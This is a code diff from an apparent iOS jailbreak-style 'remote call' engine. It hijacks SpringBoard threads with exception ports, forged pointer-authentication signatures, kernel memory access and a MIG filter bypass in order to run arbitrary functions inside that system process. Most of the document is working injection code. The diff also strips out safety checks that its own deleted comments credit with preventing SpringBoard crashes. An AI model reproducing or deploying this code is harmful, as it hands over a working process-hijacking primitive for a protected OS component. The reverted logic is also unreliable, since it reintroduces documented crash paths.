-    // runs: 0x303266d40 at 18:20:18 and 0x302845ba0 at 18:24:07. The selector is
-    // ours — setTarget: is only ever sent to an NSInvocation, on the invocation
-    // r_msg2_struct built a few lines above — so the pointer that came back in x0
-    // was handed on as that invocation, and the block behind it had already been
-    // released and given to BackBoard for a HID deferring token.
-    //
-    // Replying with the faulting state unchanged, which is what this used to do,
-    // is the other half of it. The thread then resumes in the middle of the
-    // callee, raises again, and that second message is what the NEXT call reads
-    // as its park. That is the 10-second cadence in the 18:24 log: one call per
-    // message, every message out of phase by one.
-    if (native_strip(exc2.threadState.__pc) != FAKE_LR_TROJAN) {
-        RC_DIAG("stable/%s FAULT in the callee pc=0x%llx (a return lands on 0x%llx) — "
-                "0, not a register; reparked", name ?: "(addr-call)",
-                (unsigned long long)native_strip(exc2.threadState.__pc),
-                (unsigned long long)FAKE_LR_TROJAN);
-        g_RC_lastTempStep = 23;
-        g_RC_success = false;
-        rc_repark_at(&exc2, FAKE_LR_TROJAN);
-        return 0;
-    }
+            (unsigned long long)retValue);
     // Re-park: reply keeps thread blocked in exception until next hijack.
-    //
-    // x8 is cleared here and not left as the callee returned it. x8 is the arm64
-    // INDIRECT_RESULT register: it is the address a function returning a struct
-    // wider than 16 bytes writes into, and its contents mean nothing once that
-    // function has returned. The address it holds here is a buffer the caller
-    // allocated in the target and has already freed by the time this runs, so
-    // re-publishing it parks the thread with a pointer to a released block. The
-    // next call reads that x8, and a selector that returns a struct writes
-    // through it. The 2026-09-30 18:05 device log is that: two objc_msgSend
-    // calls returned cleanly with codeFirst = 0x101, the third faulted with
-    // codeFirst = 1 and codeSecond = 0x200057295bb2f0, a heap address, with the
-    // faulting PC inside objc_msgSend.
-    //
-    // Zero is the correct value for a thread that is parked rather than running:
-    // the callee has returned, so there is no indirect result outstanding, and
-    // the transport sets x8 explicitly on every call that does have one.
-    exc2.threadState.__x[8] = 0;
     reply_with_state(&exc2, &exc2.threadState);
     if (remote_call_should_log_result(name, true))
         printf("[%s:%d] %s func's retValue = 0x%llx(%llu)\n", __FUNCTION__, __LINE__, name ?: "(addr-call)", retValue, retValue);
@@ -2309,15 +1264,7 @@ bool restore_trojan_thread(arm_thread_state64_internal *state)
             (unsigned long long)native_strip(state->__pc),
             (unsigned long long)native_strip(state->__lr));
     state->__flags = exc.threadState.__flags;
-    if (!sign_state(g_RC_trojanThreadAddr, state, state->__pc, state->__lr)) {
-        // This is the state that puts the target's ORIGINAL thread back on its
-        // own feet. Failing to sign it and replying anyway would resume
-        // SpringBoard's hijacked thread at an unsigned PC, which is the failure
-        // that produced uncatchable crashes rather than a recoverable one.
-        RC_DIAG("restore_trojan_thread: sign_state failed, NOT resuming the original thread");
-        g_RC_success = false;
-        return false;
-    }
+    sign_state(g_RC_trojanThreadAddr, state, state->__pc, state->__lr);
     reply_with_state(&exc, state);
     RC_DIAG("restore_trojan_thread reply sent — original thread resumed");
     return true;
@@ -2359,13 +1306,7 @@ void abandon_remote_call_internal(void) {
     // (typically SpringBoard finished a respawn). Touching the dead trojan
     // would hang for the call timeout. Local resources still need releasing.
     destroy_exception_port(g_RC_firstExceptionPort);
-    // Same rule as destroy_remote_call: the synthetic call thread is parked on
-    // this port with a signed LR of 0x401, and nothing here confirms it stopped.
-    // Leaving the port installed means a late fault is caught instead of fatal.
-    // The port dies with the target on a respawn and the reaper collects it.
-    if (!g_RC_creatingExtraThread) {
-        destroy_exception_port(g_RC_secondExceptionPort);
-    }
+    destroy_exception_port(g_RC_secondExceptionPort);
     if (g_RC_dummyThread) pthread_cancel(g_RC_dummyThread);
     if (MACH_PORT_VALID(g_RC_dummyThreadMach)) {
         mach_port_deallocate(mach_task_self_, g_RC_dummyThreadMach);
@@ -2386,10 +1327,6 @@ void abandon_remote_call_internal(void) {
     g_RC_vmMap = 0;
     g_RC_callThreadAddr = 0;
     g_RC_trojanThreadAddr = 0;
-    // The cached PAC keys belong to that thread. Clearing the thread address
-    // without the keys would leave the next session signing with the previous
-    // occupant's key pair, which produces signatures that authenticate nothing.
-    pac_release_key_cache();
     g_RC_pid = 0;
     g_RC_success = false;
     g_RC_creatingExtraThread = false;
@@ -2427,75 +1364,15 @@ int destroy_remote_call_internal(void) {
         do_remote_call_stable(100, "munmap", g_RC_trojanMem, PAGE_SIZE, 0, 0, 0, 0, 0, 0);
         g_RC_trojanMem = 0;
     }
-    // The synthetic call thread is the one thing in this file that must never
-    // be left runnable while its catcher is gone.
-    //
-    // do_remote_call_stable(-1, "pthread_exit", ...) is a full remote call: it
-    // catches the parked exception, signs pc=pthread_exit and lr=FAKE_LR_TROJAN
-    // onto the state, and replies. The thread then runs, and its LR is 0x401.
-    // The -1 timeout takes the early return at the top of the call, so we do
-    // not wait for it to finish and we never learn whether it did.
-    //
-    // The next two lines then destroyed the exception port. If the thread was
-    // still inside pthread_exit, or if it returned, it did a RET to 0x401 with
-    // nothing installed to catch it. 0x401 is not in any mapped region, so the
-    // thread took EXC_BAD_ACCESS and the whole process died. That is not a
-    // theory, it is the 2026-09-29 06:39 SpringBoard report: SIGBUS,
-    // EXC_BAD_ACCESS, pc = lr = 0x401, "0x401 is not in any region", faulting
-    // thread in thread_start. It also explains why the crash is intermittent
-    // and why a heavy frame makes it more likely: the teardown only runs after
-    // a session failure, and slow calls are what cause session failures.
-    //
-    // So the port stays installed. If that thread ever does resume, its fault
-    // is caught instead of fatal, and the port becomes a dead name the reaper
-    // collects. Leaking a port is recoverable; a SIGBUS in SpringBoard is not.
-    bool callThreadMayStillBeRunning = false;
     if (g_RC_creatingExtraThread) {
-        // Always send this one, whatever the session's own verdict is.
-        //
-        // It used to be behind `if (g_RC_success)`, on the reasoning that a
-        // failed session's reply cannot be trusted. That reasoning is about the
-        // answer, and this call does not want an answer: it wants the thread to
-        // stop existing. Skipping it leaves the synthetic call thread parked on
-        // FAKE_LR_TROJAN with nothing but the second exception port between it
-        // and a SIGBUS, and a park that is never taken down accumulates one per
-        // session.
-        //
-        // 2026-09-30 22:03:29 SpringBoard-2026-09-30-220332.ips, pid 541:
-        //
-        //   exception   EXC_BAD_ACCESS SIGBUS "UNKNOWN_0x101 at 0x401"
-        //   vmRegionInfo "0x401 is not in any region"
-        //   termination  Bus error: 10, byProc "exc handler"
-        //
-        // 0x401 is FAKE_LR_TROJAN, the return address this file signs onto
-        // every call. The report is the fourth overlay attempt of that run being
-        // torn down: three earlier attempts had already faulted, so all three
-        // had set g_RC_success = false, so all three had skipped this call, and
-        // the app was killed with four SpringBoard threads parked on 0x401.
-        //
-        // The refusal gate added in 490187cf9 is what made g_RC_success false
-        // before teardown, and it is why this stopped being intermittent.
-        // g_RC_teardownCall lets exactly this one call past that gate. The
-        // thread is signed pc=pthread_exit lr=FAKE_LR_TROJAN and pthread_exit
-        // does not return, so the link register is never used; and the second
-        // port is deliberately left installed below, so a thread that faults
-        // before it gets there is caught instead of fatal.
-        g_RC_teardownCall = true;
         do_remote_call_stable(-1, "pthread_exit", 0, 0, 0, 0, 0, 0, 0, 0);
-        g_RC_teardownCall = false;
-        callThreadMayStillBeRunning = true;
     }
     else {
-        // This branch resumes the target's ORIGINAL thread on its own PC and
-        // LR, which is the state it was running before we touched it. That is
-        // ordinary code and its port is ours to close.
         restore_trojan_thread(&g_RC_originalState);
     }
 
     destroy_exception_port(g_RC_firstExceptionPort);
-    if (!callThreadMayStillBeRunning) {
-        destroy_exception_port(g_RC_secondExceptionPort);
-    }
+    destroy_exception_port(g_RC_secondExceptionPort);
     if (g_RC_dummyThread) pthread_cancel(g_RC_dummyThread);
     if (MACH_PORT_VALID(g_RC_dummyThreadMach)) {
         mach_port_deallocate(mach_task_self_, g_RC_dummyThreadMach);
@@ -2516,10 +1393,6 @@ int destroy_remote_call_internal(void) {
     g_RC_vmMap = 0;
     g_RC_callThreadAddr = 0;
     g_RC_trojanThreadAddr = 0;
-    // The cached PAC keys belong to that thread. Clearing the thread address
-    // without the keys would leave the next session signing with the previous
-    // occupant's key pair, which produces signatures that authenticate nothing.
-    pac_release_key_cache();
     g_RC_pid = 0;
     g_RC_success = false;
     g_RC_creatingExtraThread = false;
@@ -2641,23 +1514,8 @@ bool remote_read_internal(uint64_t src, void *dst, uint64_t size)
 
         struct VMShmem *page = get_shmem_for_page(pageAddr);
         if (!page) {
-            // Rate limited for the same reason RC_DIAG is. remote_read is the
-            // busiest call in the memory path, so a page that cannot be mapped
-            // fails once per read rather than once per frame, and a caller that
-            // keeps asking for the same bad address turns this line into the
-            // same logd flood RC_DIAG was: an os_log round trip per failure,
-            // inside the two global remote-call locks. One line a second still
-            // says it is happening and the address it is happening at.
-            static uint64_t s_readFailLast = 0;
-            static uint64_t s_readFailCount = 0;
-            const uint64_t now = remote_call_diag_now_us();
-            s_readFailCount++;
-            if (s_readFailLast == 0 || now - s_readFailLast >= 1000000ULL) {
-                s_readFailLast = now;
-                NSLog(@"[RemoteCall] DIAG remote_read FAIL no page for src=0x%llx (x%llu in this second)",
-                      (unsigned long long)src, (unsigned long long)s_readFailCount);
-                s_readFailCount = 0;
-            }
+            NSLog(@"[RemoteCall] DIAG remote_read FAIL no page for src=0x%llx",
+                  (unsigned long long)src);
             return false;
         }
         memcpy((void *)(uintptr_t)dstAddr, (void *)(uintptr_t)(page->localAddress + offs), (size_t)copyCount);
@@ -3150,7 +2008,6 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
                 drainHits,
                 (unsigned long long)native_strip(exc2.threadState.__pc),
                 (unsigned long long)native_strip(exc2.threadState.__lr));
-        exc2.threadState.__x[8] = 0;   // INDIRECT_RESULT, meaningless while parked
         reply_with_state(&exc2, &exc2.threadState);
     }
     RC_DIAG("pre-creator drain done hits=%d", drainHits);
@@ -3158,27 +2015,8 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
     if (!g_RC_trojanThreadAddr)
         g_RC_trojanThreadAddr = firstThread;
 
-    // The thread every call is parked on, and the target's main thread, are the
-    // same thing unless the synthetic call thread is in use. Callers that have
-    // to reason about "am I on the main thread already" need that fact, so keep
-    // it rather than making them re-derive it from the thread list.
-    g_RC_mainThreadAddr = firstThread;
-    RC_DIAG("main thread 0x%llx trojan=0x%llx (equal=%d)",
-            (unsigned long long)g_RC_mainThreadAddr,
-            (unsigned long long)g_RC_trojanThreadAddr,
-            g_RC_mainThreadAddr == g_RC_trojanThreadAddr);
-
     arm_thread_state64_internal newState = exc.threadState;
-    newState.__x[8] = 0;      // INDIRECT_RESULT, meaningless while parked
-    if (!sign_state(g_RC_trojanThreadAddr, &newState, FAKE_PC_TROJAN_CREATOR, FAKE_LR_TROJAN_CREATOR)) {
-        // Nothing has been replied yet at this point, so the target is still
-        // parked in its exception and this is still a clean place to stop. The
-        // caller sees a failed init and the session state is torn down by
-        // destroy_remote_call on the way out.
-        RC_DIAG("creator-park: sign_state failed, aborting init");
-        g_RC_success = false;
-        return -1;
-    }
+    sign_state(g_RC_trojanThreadAddr, &newState, FAKE_PC_TROJAN_CREATOR, FAKE_LR_TROJAN_CREATOR);
     RC_DIAG("creator-park signer=0x%llx signedPC=0x%llx signedLR=0x%llx flags=0x%x",
             (unsigned long long)g_RC_trojanThreadAddr,
             (unsigned long long)newState.__pc,
@@ -3212,17 +2050,12 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
     //   canary DEAD via remote_write, then SB-side memcpy bounce to heap
     //   (heap remap known-good) so we see what SB's MMU sees at out.
     uint64_t trapSP = (uint64_t)exc.threadState.__sp & 0x7fffffffffULL;
+    uint64_t trojanMemTemp = trapSP - 0x100ULL;
     g_RC_vmMap = task_get_vm_map(g_RC_taskAddr);
     g_RC_success = true;
-
-    // 734a5e248: out = (SP & 0x7fffffffff) - 0x100, no validity gate. A gate
-    // here that rejects the address cannot help, because the only other value
-    // this file has ever used is a heap malloc, and that one faulted and
-    // poisoned the create with the size argument (0x10). Kept verbatim.
-    uint64_t outBuf = trapSP - 0x100ULL;
     RC_DIAG("Fl0rk out=SP-0x100: SP=0x%llx out=0x%llx vmMap=0x%llx",
             (unsigned long long)trapSP,
-            (unsigned long long)outBuf,
+            (unsigned long long)trojanMemTemp,
             (unsigned long long)g_RC_vmMap);
 
     uint64_t remoteCrashSigned = remote_pac(g_RC_trojanThreadAddr, FAKE_PC_TROJAN, 0);
@@ -3249,88 +2082,56 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
     const bool ios26StubPthread = SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(@"26.0");
     uint64_t callThreadPort = 0;
     bool createdSuspended = false;
-    g_RC_createDead = false;
-    g_RC_callThreadPath = "";
 
     if (!ios26StubPthread) {
-        // Fl0rk: start = remote_pac(trojan, 0x301, 0). Creation-time PC is the
-        // park trap. Suspended_np does not run start until resume; create-success
-        // parks via set_state first. Stripped getpid still faulted create here
-        // with out=SP-0x100 already correct (e268f92).
+        // Park the synthetic thread by making FAKE_PC the *start routine*, the
+        // way Cyanide and Fl0rk do it. The thread is created suspended, so the
+        // kernel itself records PC=0x301 as creation-time state; the first thing
+        // the thread does after thread_resume is fault at 0x301, which lands in
+        // secondExceptionPort. Nothing written afterwards can perturb that.
+        //
+        // The fork instead used startRoutine = signed local getpid and then
+        // overwrote the state with thread_set_state(). That park never took:
+        // SB IPS 2026-09-26 06:21:04 shows thread_set_state returning kr=0 while
+        // the resumed thread still ran getpid with sp=0 — neither the 0x301 PC
+        // nor the borrowed SP landed, and the call thread then answered with an
+        // all-zero state that we used to reply onto (SIGKILL, CODESIGNING
+        // "Invalid Page"). Parking in creation-time state removes every
+        // unproven step: the remote_write into SB heap, the malloc/free of the
+        // state buffer, and the ARM_THREAD_STATE64 count semantics.
         uint64_t startRoutine = remoteCrashSigned;
-        const char *startKind = "signed_0x301";
-        if (!startRoutine) {
-            g_RC_callThreadStep = 12;
-            RC_DIAG("no start routine signature — cannot create call thread");
+        const char *startKind = "pac_0x301";
+        if (!startRoutine || startRoutine == (uint64_t)-1) {
+            RC_DIAG("remote_pac(FAKE_PC_TROJAN) failed — cannot create call thread");
             fail_after_creator_park(RemoteCallInitFailurePthreadCreate, targetPid);
             return -1;
         }
 
-        if (!outBuf) {
-            g_RC_callThreadStep = 10;
-            g_RC_createDead = true;
-            RC_DIAG("no target out buffer for pthread_create_suspended_np — "
-                    "abandoning the create, thread[1] reuse next");
-        }
-
         NSArray<NSNumber *> *threadsBefore = collect_all_task_threads(g_RC_taskAddr);
 
-        RC_DIAG("pthread_create_suspended_np start=%s 0x%llx out=0x%llx (SP-0x100)",
+        RC_DIAG("pthread_create_suspended_np start=%s 0x%llx out=SP-0x100=0x%llx (immediate)",
                 startKind, (unsigned long long)startRoutine,
-                (unsigned long long)outBuf);
+                (unsigned long long)trojanMemTemp);
 
         uint64_t createResult = do_remote_call_temp(100, "pthread_create_suspended_np",
-                                                    outBuf, 0, startRoutine, 0, 0, 0, 0, 0);
-
-        // A return, or a fault, and the transport cannot tell them apart.
-        //
-        // do_remote_call_temp hands back x0 from whatever arrived on the port second,
-        // and a bad-access fault raised inside the function arrives on that same port
-        // with x0 holding whatever the function had loaded. It is then indistinguishable
-        // from a return, and this is the line that cost a session: a pthread_create
-        // that faulted instead of creating a thread reported a return value of 0,
-        // which is exactly what a successful pthread_create reports.
-        //
-        // A real return is the thread executing the instruction it returned to, which
-        // is the fake link register. That is the only PC that means "the function
-        // ran to completion and went home". Anything else means it did not, and the
-        // return value is a register the function never set, so nothing downstream
-        // can be trusted.
-        //
-        // Checked here and nowhere else on purpose. This call is the one that
-        // allocates memory, writes to a caller-supplied out pointer and has to come
-        // back for the whole engine to mean anything, and it is the one that has
-        // demonstrably been faulting. Making the check general would risk turning a
-        // working path into a named failure over a PC that is merely unusual.
-        if (g_RC_success &&
-            native_strip(g_RC_lastTempRetPC) != FAKE_LR_TROJAN_CREATOR) {
-            g_RC_callThreadStep = 11;
-            RC_DIAG("create did not return: retPC=0x%llx expected=0x%llx (fault, not a "
-                    "return) — abandoning the create, thread[1] reuse next",
-                    (unsigned long long)native_strip(g_RC_lastTempRetPC),
-                    (unsigned long long)FAKE_LR_TROJAN_CREATOR);
-            g_RC_createDead = true;
-        }
+                                                    trojanMemTemp, 0, startRoutine, 0, 0, 0, 0, 0);
         uint64_t pthreadAddr = 0;
         uint64_t newThreadAddr = 0;
-        if (g_RC_createDead) {
-            createdSuspended = false;
-        }
-        if (g_RC_success && !g_RC_createDead && createResult == 0) {
+        if (g_RC_success && createResult == 0) {
             uint64_t heapBounce = do_remote_call_temp(100, "malloc", 16, 0, 0, 0, 0, 0, 0, 0);
             if (g_RC_success && heapBounce) {
                 // Zero via SB memset — no KRW write to bounce (avoids shmem poison).
                 do_remote_call_temp(100, "memset", heapBounce, 0, 8, 0, 0, 0, 0, 0);
-                do_remote_call_temp(100, "memcpy", heapBounce, outBuf, 8, 0, 0, 0, 0, 0);
+                do_remote_call_temp(100, "memcpy", heapBounce, trojanMemTemp, 8, 0, 0, 0, 0, 0);
                 clear_remote_shmem_cache();
                 pthreadAddr = remote_read64(heapBounce);
                 RC_DIAG("post-pthread out=0x%llx sb_via_bounce=0x%llx",
-                        (unsigned long long)outBuf,
+                        (unsigned long long)trojanMemTemp,
                         (unsigned long long)pthreadAddr);
                 do_remote_call_temp(100, "free", heapBounce, 0, 0, 0, 0, 0, 0, 0);
             } else {
                 clear_remote_shmem_cache();
-                pthreadAddr = remote_read64(outBuf);
+                pthreadAddr = remote_read64(trojanMemTemp);
                 RC_DIAG("post-pthread bounce miss — raw remapped read=0x%llx",
                         (unsigned long long)pthreadAddr);
             }
@@ -3342,11 +2143,6 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
                     break;
                 }
             }
-            // Recorded before the branch below can overwrite it, because "the create
-            // worked and the thread list did not change" and "the out pointer came
-            // back empty" are different faults and both of them used to report as the
-            // same one.
-            g_RC_callThreadStep = newThreadAddr ? 0 : 2;
             if (newThreadAddr && is_kaddr_valid(newThreadAddr)) {
                 RC_DIAG("found synthetic thread kaddr=0x%llx (before=%lu after=%lu)",
                         (unsigned long long)newThreadAddr,
@@ -3354,7 +2150,6 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
                         (unsigned long)threadsAfter.count);
             }
         } else {
-            g_RC_callThreadStep = 1;
             RC_DIAG("pthread_create_suspended_np failed result=%llu success=%d — thread[1]",
                     (unsigned long long)createResult, (int)g_RC_success);
         }
@@ -3366,12 +2161,6 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
             if (callThreadPort) {
                 g_RC_callThreadAddr = newThreadAddr;
                 createdSuspended = true;
-            } else {
-                // Expected on some paths, per the note at the fallback below: SpringBoard
-                // holds no mach port name for a thread it never made a port for.
-                // Recorded so the console can say exactly that, instead of leaving the
-                // reader to infer it from a failure that has nothing to do with it.
-                g_RC_callThreadStep = 4;
             }
         } else if (pthreadAddr && pthreadAddr != kCanary) {
             callThreadPort = do_remote_call_temp(100, "pthread_mach_thread_np", pthreadAddr, 0, 0, 0, 0, 0, 0, 0);
@@ -3381,18 +2170,15 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
                 if (is_kaddr_valid(g_RC_callThreadAddr)) {
                     createdSuspended = true;
                 } else {
-                    g_RC_callThreadStep = 7;
                     RC_DIAG("synthetic kobject invalid — thread[1]");
                     callThreadPort = 0;
                 }
             } else {
-                g_RC_callThreadStep = 6;
                 callThreadPort = 0;
             }
         } else {
-            g_RC_callThreadStep = newThreadAddr ? 3 : 5;
-            RC_DIAG("create miss (bounce=0x%llx newThread=0x%llx) — falling through to thread[1] reuse",
-                    (unsigned long long)pthreadAddr, (unsigned long long)newThreadAddr);
+            RC_DIAG("create miss (bounce=0x%llx) — falling through to thread[1] reuse",
+                    (unsigned long long)pthreadAddr);
         }
     } else {
         RC_DIAG("iOS26+ pthread stubs — skipping create; trying thread[1] reuse");
@@ -3407,19 +2193,15 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
     bool parkedViaGuard = false;
     if (!callThreadPort) {
         if (g_RC_threadList.count < 2) {
-            g_RC_callThreadStep = 8;
-            g_RC_callThreadPath = g_RC_createDead ? "create-failed-no-reuse" : "no-port";
             RC_DIAG("no inject thread[1] — cannot build extra call thread");
             fail_after_creator_park(RemoteCallInitFailureCallThread, targetPid);
             return -1;
         }
         uint64_t thread2Addr = g_RC_threadList[1].unsignedLongLongValue;
         if (!is_kaddr_valid(thread2Addr) || thread2Addr == g_RC_trojanThreadAddr) {
-            g_RC_callThreadStep = 9;
-            RC_DIAG("thread[1] invalid/same-as-signer addr=0x%llx trojan=0x%llx (list=%lu)",
+            RC_DIAG("thread[1] invalid/same-as-signer addr=0x%llx trojan=0x%llx",
                     (unsigned long long)thread2Addr,
-                    (unsigned long long)g_RC_trojanThreadAddr,
-                    (unsigned long)g_RC_threadList.count);
+                    (unsigned long long)g_RC_trojanThreadAddr);
             fail_after_creator_park(RemoteCallInitFailureCallThread, targetPid);
             return -1;
         }
@@ -3463,19 +2245,15 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
         mig_bypass_pause();
 
     if (callThreadPort && createdSuspended) {
-        // Working build 734a5e248: creation-time PC is already signed 0x301
-        // (startRoutine = remote_pac(0x301)). Releasing the suspended thread
-        // IS the park — first instruction faults into secondExceptionPort.
-        //
-        // Later commits replaced this with local thread_get_state/set_state on
-        // callThreadPort. That port name lives in SpringBoard's ipc_space, not
-        // ours, so those wrappers operated on the wrong task. 734a5e measured
-        // that remote set_state also failed to stick (IPS 2026-09-26). Do not
-        // bring either back.
-        RC_DIAG("resuming synthetic call thread (creation-time PC=0x301)");
-        g_RC_callThreadPath = "create";
-        uint64_t ret = do_remote_call_temp(100, "thread_resume",
-                                           callThreadPort, 0, 0, 0, 0, 0, 0, 0);
+        // Fresh suspended pthread whose creation-time PC is signed 0x301.
+        // There is deliberately no thread_set_state park here: releasing the
+        // thread IS the park. The removed block set state via remote_write into
+        // SB heap + a remote thread_set_state, and that never took --
+        // thread_set_state returned kr=0 while the resumed thread still ran the
+        // start routine with sp=0 (SB IPS 2026-09-26 06:21:04).
+        RC_DIAG("resuming synthetic call thread (creation-time PC=0x%llx)",
+                (unsigned long long)remoteCrashSigned);
+        uint64_t ret = do_remote_call_temp(100, "thread_resume", callThreadPort, 0, 0, 0, 0, 0, 0, 0);
         if (ret != 0) {
             RC_DIAG("thread_resume synthetic failed ret=%llu (no originalThreadOnly fallback)",
                     (unsigned long long)ret);
@@ -3495,53 +2273,24 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
             // otherwise the thread stays suspended forever.
             do_remote_call_temp(100, "thread_resume", callThreadPort, 0, 0, 0, 0, 0, 0, 0);
         }
-        // The state is the reused thread's own, and the two program counters are
-        // signed for the reused thread. Both were wrong, and both are the same defect
-        // the fresh-thread park had two commits ago, missed here because this path
-        // goes through a different helper and so was not touched when that one was
-        // fixed:
-        //
-        //   the stack and frame pointers came from g_RC_originalState, which belongs
-        //     to the hijacked thread. The reused thread was parked on someone else's
-        //     stack, which is what the 2026-09-26 IPS recorded as a set_state
-        //     returning kr=0 while the thread ran getpid with sp=0.
-        //   the program counters were signed with g_RC_trojanThreadAddr's PAC keys.
-        //     Signatures are per thread on arm64e, so a program counter signed for
-        //     one thread does not authenticate when another one resumes it, and the
-        //     thread faults at the moment it is released — a fault the reuse path
-        //     was in no position to distinguish from anything else.
-        //
-        // A live SpringBoard thread has a real stack pointer, a real frame pointer and
-        // real flags, and reading them is the only way to keep all three.
-        // EXC_GUARD park keeps the trapped thread's own SP/FP/flags and only
-        // installs signed PC/LR from this buffer. Sign with trojanThreadAddr -
-        // same as the stable reply path (signing with callThreadAddr produced
-        // uncatchable RET->0x401 SIGBUS). Do not copy g_RC_originalState SP here;
-        // that was the hijacked-sp crash.
         arm_thread_state64_internal park = {0};
+        park.__sp = g_RC_originalState.__sp;
+        park.__fp = g_RC_originalState.__fp;
         park.__flags = g_RC_originalState.__flags;
-        if (!sign_state(g_RC_trojanThreadAddr, &park, FAKE_PC_TROJAN, FAKE_LR_TROJAN)) {
-            RC_DIAG("EXC_GUARD park: sign_state failed, not parking thread[1]");
-            g_RC_callThreadStep = 15;
-            g_RC_callThreadPath = "reuse1-sign-failed";
-            g_RC_success = false;
-            return -1;
-        }
-        RC_DIAG("EXC_GUARD park thread[1]=0x%llx signedPC=0x%llx signedLR=0x%llx",
+        sign_state(g_RC_trojanThreadAddr, &park, FAKE_PC_TROJAN, FAKE_LR_TROJAN);
+        RC_DIAG("TRO-swap park thread[1]=0x%llx pc=0x%llx lr=0x%llx",
                 (unsigned long long)g_RC_callThreadAddr,
                 (unsigned long long)park.__pc,
                 (unsigned long long)park.__lr);
-        RC_DIAG("EXC_GUARD park begin (fail restores main)");
-        g_RC_callThreadPath = "reuse1-exc-guard";
-        if (!park_remote_thread_via_tro_swap(g_RC_callThreadAddr, &park,
+        RC_DIAG("TRO-swap park begin (no join; fail restores main)");
+        if (!park_remote_thread_via_tro_swap(g_RC_callThreadAddr, park.__pc, park.__lr,
                                              useMigFilterBypass)) {
-            RC_DIAG("EXC_GUARD park failed — restoring main @0x201");
-            g_RC_callThreadStep = 16;
+            RC_DIAG("TRO-swap park failed — restoring main @0x201");
             fail_after_creator_park(RemoteCallInitFailureCallThread, targetPid);
             return -1;
         }
-        parkedViaGuard = true;
-        RC_DIAG("parked thread[1] at 0x301 via EXC_GUARD + reply_with_state");
+        parkedViaGuard = true; // reused flag: parked without SB port
+        RC_DIAG("parked thread[1] at 0x301 via TRO-swap set_state (no port)");
     }
     (void)parkedViaGuard;
 
@@ -3563,26 +2312,10 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
     // session is unusable — bail instead of falling through to the unconditional
     // `g_RC_success = true` at the end, which used to hand callers a live-looking
     // but broken session (every later objc_msgSend then went nowhere).
-    //
-    // g_RC_success is the whole of that test, and the pid is not part of it. The
-    // proof is that the call completed, and g_RC_success is what the transport sets
-    // when it does not: a wait that gave up, a state it refused to reply onto, a
-    // signature it could not produce. Adding "and the pid is non-zero" asked a
-    // second question of a call whose return value cannot answer it, and it is the
-    // same mistake as the bootstrap's, one call later and for the same reason.
-    //
-    // A zero pid is harmless here, which is worth saying out loud because it looks
-    // load-bearing. Nothing addresses the target through it. g_RC_taskAddr, from
-    // task_for_pid at the top of init, is what every call in the engine goes
-    // through. g_RC_pid is read in exactly three places outside this file, and all
-    // three are diagnostics: remote_call_current_pid tags the PUSH-REARM log line,
-    // and r_sel and r_class use it as the key for the selector and class caches.
-    // A cache key of zero is a perfectly good cache key, and it is scoped to the
-    // session either way, because the caches are dropped in teardown.
-    if (!g_RC_success) {
-        RC_DIAG("first stable getpid failed (success=%d pid=%d) — tearing down session",
-                (int)g_RC_success, (int)g_RC_pid);
-        fail_after_creator_park(RemoteCallInitFailureFirstStableCall, targetPid);
+    if (!g_RC_success || !g_RC_pid) {
+        RC_DIAG("first stable getpid failed (success=%d) — tearing down session",
+                (int)g_RC_success);
+        fail_after_creator_park(RemoteCallInitFailureCallThread, targetPid);
         return -1;
     }
 
@@ -3591,24 +2324,6 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
 
     do_remote_call_stable(100, "memset", g_RC_trojanMem, 0, PAGE_SIZE, 0, 0, 0, 0, 0);
     RC_DIAG("stable memset done");
-
-    // The borrowed threads are deliberately left bound to this port.
-    //
-    // It was tried the other way: 93c125e9 set MACH_PORT_NULL on every thread init
-    // had touched, to stop a natural fault from being swallowed by a queue with no
-    // reader. That was never validated, and it touches exactly the thing that now
-    // kills SpringBoard.
-    //
-    // The crash is EXC_BAD_ACCESS / SIGBUS at 0x401, which is FAKE_LR_TROJAN, on a
-    // thread this project created with thread_start. That address is the return
-    // trap the whole design depends on: the synthetic call thread runs the
-    // selector, returns to 0x401, and the exception is caught on
-    // secondExceptionPort. Reaching it as a fatal SIGBUS means the thread had no
-    // exception port covering it at that moment, which is a thread losing its
-    // binding rather than a thread faulting somewhere unexpected.
-    //
-    // Unverified code that rebinds exception ports on live threads is not worth
-    // the risk of keeping while that is unexplained. back to 7ac7c454 behaviour.
 
     g_RC_success = true;
     RC_DEBUG("[%s:%d] Finished successfully\n", __FUNCTION__, __LINE__);
